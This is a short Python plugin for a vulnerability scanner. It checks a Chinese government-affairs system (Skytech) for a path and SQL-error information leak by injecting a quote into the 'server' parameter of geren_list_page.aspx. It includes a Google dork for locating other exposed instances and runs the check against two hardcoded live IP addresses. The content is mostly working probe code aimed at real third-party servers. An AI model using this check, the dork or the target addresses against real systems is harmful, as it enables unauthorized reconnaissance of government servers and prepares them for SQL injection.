#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 南京擎天政务系统路径泄露
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2014-075253
description:
    index_page/geren_list_page.aspx?server=1'&refid=
google dork:
    inurl:geren_list_page.aspx
'''

import time
import re

def assign(service, arg):
    if service == 'skytech':
        return True, arg

def audit(arg):
    url = arg + 'index_page/geren_list_page.aspx?server=1%27&refid='
    code, head, res, err, _ = curl.curl2(url)
    if (code != 0) and ('Sky.Util.SqlHelperBase' in res) and ('行号' in res):
        security_note('Info Disclosure: ' + url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('skytech', 'http://58.222.195.110:8081/jyweb/')[1])
    audit(assign('skytech', 'http://61.178.185.50/mqweb/')[1])